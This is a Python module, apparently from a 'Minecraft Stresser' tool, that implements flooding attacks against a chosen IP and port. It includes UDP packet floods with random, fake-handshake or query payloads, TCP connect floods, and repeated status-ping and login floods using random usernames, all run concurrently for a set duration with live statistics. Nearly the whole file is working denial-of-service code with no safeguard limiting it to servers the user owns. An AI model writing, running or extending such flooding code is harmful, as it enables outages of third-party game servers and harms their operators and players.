"""
Attack implementations for Minecraft Stresser
"""
import asyncio
import socket
import random
import time
import logging
import sys
from dataclasses import dataclass
from .protocol import MinecraftProtocol
from .utils import generate_random_username, generate_random_bytes, format_stats_line, print_final_stats


DEFAULT_UDP_DELAY = 0.001
DEFAULT_TCP_DELAY = 0.01
PAYLOAD_POOL_SIZE = 64


@dataclass
class AttackStats:
    """Attack statistics"""
    sent: int = 0
    success: int = 0
    error: int = 0
    timeout: int = 0
    refused: int = 0
    closed_by_server: int = 0


class AttackManager:
    """Manages different types of attacks"""

    def __init__(self, rate_delay: float | None = None):
        self.stats = AttackStats()
        self.udp_delay = rate_delay if rate_delay is not None else DEFAULT_UDP_DELAY
        self.tcp_delay = rate_delay if rate_delay is not None else DEFAULT_TCP_DELAY

    async def run_attack(self, protocol: str, method: str, ip: str, port: int,
                        duration: int, threads: int, packet_size: int = 1024):
        """Run the attack with real-time stats"""
        print(f"[🚀] Starting {protocol.upper()} {method} attack on {ip}:{port}")
        print(f"[📊] Duration: {duration}s | Threads: {threads}")

        logging.info(f"Attack started: {protocol.upper()} {method} on {ip}:{port} | Duration: {duration}s | Threads: {threads}")

        self.stats = AttackStats()
        tasks = []

        if protocol == "udp":
            for _ in range(threads):
                task = asyncio.create_task(
                    self.udp_worker(ip, port, duration, packet_size, method)
                )
                tasks.append(task)
        else:
            worker_func = {
                "connect": self.tcp_connect_worker,
                "join": self.tcp_join_worker,
                "login": self.tcp_login_worker
            }.get(method, self.tcp_connect_worker)

            for _ in range(threads):
                task = asyncio.create_task(
                    worker_func(ip, port, duration)
                )
                tasks.append(task)

        stats_task = asyncio.create_task(self.display_stats(duration))

        try:
            await asyncio.gather(*tasks, return_exceptions=True)
        except Exception as e:
            logging.error(f"Attack error: {e}")

        stats_task.cancel()
        print_final_stats(protocol, method, self.stats)
        logging.info(f"Attack completed | Sent: {self.stats.sent} | Success: {self.stats.success} | Errors: {self.stats.error}")

    def _build_payload_pool(self, packet_size: int, payload_type: str) -> list[bytes]:
        """Pre-generate a pool of payloads to avoid per-send overhead"""
        pool = []
        for _ in range(PAYLOAD_POOL_SIZE):
            if payload_type == "spam":
                pool.append(generate_random_bytes(packet_size))
            elif payload_type == "handshake":
                pool.append(bytes([0x00, 0x00]) + generate_random_bytes(max(0, packet_size - 2)))
            elif payload_type == "query":
                pool.append(bytes([0xFE, 0x01]) + generate_random_bytes(max(0, packet_size - 2)))
        return pool

    async def udp_worker(self, ip: str, port: int, duration: int, packet_size: int, payload_type: str):
        """Async UDP worker"""
        end_time = time.time() + duration
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.connect((ip, port))
        sock.setblocking(False)

        loop = asyncio.get_running_loop()
        pool = self._build_payload_pool(packet_size, payload_type)
        idx = 0

        try:
            while time.time() < end_time:
                payload = pool[idx % PAYLOAD_POOL_SIZE]
                idx += 1

                try:
                    await loop.sock_sendall(sock, payload)
                    self.stats.sent += 1
                except Exception as e:
                    logging.error(f"UDP send error: {e}")
                    self.stats.error += 1

                await asyncio.sleep(self.udp_delay)

        except Exception as e:
            logging.error(f"UDP worker error: {e}")
            self.stats.error += 1
        finally:
            sock.close()

    async def tcp_connect_worker(self, ip: str, port: int, duration: int):
        """Async TCP connect worker"""
        end_time = time.time() + duration
        loop = asyncio.get_running_loop()

        while time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setblocking(False)

                try:
                    self.stats.sent += 1
                    await asyncio.wait_for(
                        loop.sock_connect(sock, (ip, port)),
                        timeout=1.0
                    )
                    self.stats.success += 1
                except asyncio.TimeoutError:
                    self.stats.timeout += 1
                except ConnectionRefusedError:
                    self.stats.refused += 1
                except Exception as e:
                    logging.error(f"TCP connect error: {e}")
                    self.stats.error += 1
                finally:
                    sock.close()

            except Exception as e:
                logging.error(f"TCP worker setup error: {e}")
                self.stats.error += 1

            await asyncio.sleep(self.tcp_delay)

    async def tcp_join_worker(self, ip: str, port: int, duration: int):
        """Async TCP status ping worker (improved handshake)"""
        end_time = time.time() + duration
        loop = asyncio.get_running_loop()

        while time.time() < end_time:
            sock = None
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                sock.setblocking(False)

                self.stats.sent += 1

                await asyncio.wait_for(
                    loop.sock_connect(sock, (ip, port)),
                    timeout=2.0
                )

                if not await MinecraftProtocol.perform_handshake(sock, ip, port, 1):
                    self.stats.error += 1
                    await asyncio.sleep(self.tcp_delay)
                    continue

                if not await MinecraftProtocol.perform_status_request(sock):
                    self.stats.error += 1
                    await asyncio.sleep(self.tcp_delay)
                    continue

                try:
                    response = await asyncio.wait_for(
                        loop.sock_recv(sock, 4096),
                        timeout=1.0
                    )
                    if response:
                        self.stats.success += 1
                    else:
                        self.stats.closed_by_server += 1
                except asyncio.TimeoutError:
                    self.stats.timeout += 1

            except ConnectionRefusedError:
                self.stats.refused += 1
            except asyncio.TimeoutError:
                self.stats.timeout += 1
            except Exception as e:
                logging.error(f"TCP join error: {e}")
                self.stats.error += 1
            finally:
                if sock:
                    sock.close()

            await asyncio.sleep(self.tcp_delay)

    async def tcp_login_worker(self, ip: str, port: int, duration: int):
        """Async TCP login worker (improved with proper protocol)"""
        end_time = time.time() + duration
        loop = asyncio.get_running_loop()

        while time.time() < end_time:
            sock = None
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                sock.setblocking(False)

                self.stats.sent += 1

                await asyncio.wait_for(
                    loop.sock_connect(sock, (ip, port)),
                    timeout=2.0
                )

                username = generate_random_username()

                if not await MinecraftProtocol.perform_handshake(sock, ip, port, 2):
                    self.stats.error += 1
                    await asyncio.sleep(self.tcp_delay)
                    continue

                if not await MinecraftProtocol.perform_login_start(sock, username):
                    self.stats.error += 1
                    await asyncio.sleep(self.tcp_delay)
                    continue

                try:
                    response = await asyncio.wait_for(
                        loop.sock_recv(sock, 4096),
                        timeout=2.0
                    )
                    if response:
                        self.stats.success += 1
                    else:
                        self.stats.closed_by_server += 1
                except asyncio.TimeoutError:
                    self.stats.timeout += 1

            except ConnectionRefusedError:
                self.stats.refused += 1
            except asyncio.TimeoutError:
                self.stats.timeout += 1
            except Exception as e:
                logging.error(f"TCP login error: {e}")
                self.stats.error += 1
            finally:
                if sock:
                    sock.close()

            await asyncio.sleep(self.tcp_delay)

    async def display_stats(self, duration: int):
        """Display real-time statistics"""
        start_time = time.time()
        try:
            while True:
                elapsed = time.time() - start_time
                if elapsed >= duration:
                    break

                sys.stdout.write(format_stats_line(elapsed, self.stats))
                sys.stdout.flush()

                await asyncio.sleep(0.5)
        except asyncio.CancelledError:
            pass
        print()